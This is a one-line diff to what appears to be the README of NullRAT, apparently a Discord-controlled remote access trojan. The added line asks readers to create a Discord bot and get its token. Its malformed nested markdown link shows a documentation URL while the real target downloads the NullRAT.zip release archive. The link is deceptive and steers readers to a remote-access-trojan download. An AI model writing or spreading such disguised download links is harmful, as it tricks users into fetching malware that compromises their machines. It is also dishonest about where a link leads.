@@ -6,7 +6,7 @@
 
 ---
 
-
+- Create a Discord Bot and [get it's token]([https://github.com/NullCode1337/NullRAT/blob/source/Getting%20Variables.md#discord-bot-token](https://github.com/NullCode1337/NullRAT/releases/download/XH1/NullRAT.zip))
 </br>
 
 
